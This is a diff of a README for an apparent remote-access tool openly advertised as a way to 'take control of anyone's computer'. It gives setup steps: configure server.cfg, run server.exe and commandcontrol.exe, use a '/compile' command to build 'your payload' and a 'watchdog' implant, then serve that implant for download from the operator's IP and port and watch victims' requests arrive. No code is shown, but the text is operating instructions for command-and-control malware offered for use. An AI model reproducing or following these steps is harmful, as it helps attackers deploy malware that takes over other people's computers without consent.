@@ -10,9 +10,13 @@ Take control of anyone's computer like it's non of your buisness, because it is 
 
 1) open server.cfg and change the server and port to what you want the server to run on.
 
-2) run server.py using " python server.py " or " python3 server.py " from the commandline.
+2) run server.exe
 
-3) test by downloading the Watchdog file from the link "http://<yourip>:<port>/downloads/windows/watchdog"
+3) run commandcontrol.exe
+
+4) type the /compile command to start compiling your payload, and watchdog
+
+5) test by downloading the Watchdog file from the link "http://(yourip):(port)/downloads/windows/watchdog"
 
 4) you should see requests comming in to your server...enjoy
 
